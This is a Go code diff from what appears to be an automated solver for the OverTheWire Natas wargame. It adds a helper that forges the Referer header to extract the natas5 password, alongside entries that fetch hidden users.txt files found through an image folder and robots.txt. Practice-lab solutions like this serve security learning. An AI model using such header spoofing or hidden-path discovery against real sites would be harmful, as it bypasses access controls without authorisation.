@@ -53,11 +53,29 @@ func (p Path) Grab(r http.Request) (string, error) {
 	return s, err
 }
 
+type Headers struct {
+	Grabber
+	Headers http.Header
+}
+
+func (h Headers) Grab(r http.Request) (string, error) {
+	oldHeaders := r.Header
+	r.Header = make(http.Header)
+	for key, value := range oldHeaders {
+		r.Header[key] = value
+	}
+	for key, value := range h.Headers {
+		r.Header[key] = value
+	}
+	return h.Grabber.Grab(r)
+}
+
 var levels = [...]Grabber{
 	Prefixed{"The password for natas1 is ", 32},
 	Prefixed{"The password for natas2 is ", 32},
 	Path{Prefixed{"natas3:", 32}, "/files/users.txt"},  // image @ /files/pixel.png, go to folder, find users.txt
 	Path{Prefixed{"natas4:", 32}, "/s3cr3t/users.txt"}, // robots.txt references /s3cr3t/, find users.txt
+	Headers{Prefixed{"The password for natas5 is ", 32}, http.Header{"Referer": []string{"http://natas5.natas.labs.overthewire.org/"}}},
 }
 
 func main() {
